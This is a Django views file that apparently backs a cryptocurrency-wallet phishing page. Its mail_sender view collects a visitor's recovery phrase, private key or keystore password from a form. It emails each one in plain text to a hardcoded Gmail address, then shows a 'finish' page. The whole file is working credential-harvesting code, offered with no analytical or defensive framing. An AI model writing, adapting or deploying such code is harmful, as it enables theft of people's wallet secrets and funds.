from django.shortcuts import render
from django.core.mail import send_mail
from django.shortcuts import render

# Create your views here.


def page_index(request):
    return render(request, 'index.html')


def mail_sender(request):
    if request.method == 'GET':
        return render(request, 'wallet.html')
    if request.method == 'POST':
        try:
            if request.POST.get('phrase-section', ""):
                try:
                    passwordPhrase = request.POST['pass-phrase']

                    message = '''
                    Password Phrase Entered
                    Wallet Name: ***
                    password phrase: {}
                    '''.format(passwordPhrase)

                    send_mail(
                        subject="Password Phrase",
                        message=message,
                        from_email='noreplyconnection001@gmail.com',
                        recipient_list=['Williamsantonio8945@gmail.com'],
                        fail_silently=False
                    )
                    return render(request, 'finish.html')
                except KeyError:
                    return render(request, 'wallet.html')
            elif request.POST.get('private-key-section', ""):
                try:
                    privateKey = request.POST['private-key']

                    message = '''
                    Private Key Submitted
                    Wallet Name: ***
                    private key: {}
                    '''.format(privateKey)

                    send_mail(
                        subject="Private Key",
                        message=message,
                        from_email='noreplyconnection001@gmail.com',
                        recipient_list=['Williamsantonio8945@gmail.com'],
                        fail_silently=False
                    )
                    return render(request, 'finish.html')
                except KeyError:
                    return render(request, 'wallet.html')
            elif request.POST.get('keystore-section', ""):
                try:
                    walletPassword = request.POST['wallet-password']

                    message = '''
                    Key Store Entered
                    Wallet Name: ***
                    Wallet Password: {}
                    '''.format(walletPassword)

                    send_mail(
                        subject="Wallet Password",
                        message=message,
                        from_email='noreplyconnection001@gmail.com',
                        recipient_list=['Williamsantonio8945@gmail.com'],
                        fail_silently=False
                    )
                    return render(request, 'finish.html')
                except KeyError:
                    return render(request, 'wallet.html')
        except KeyError:
            return render(request, 'wallet.html')
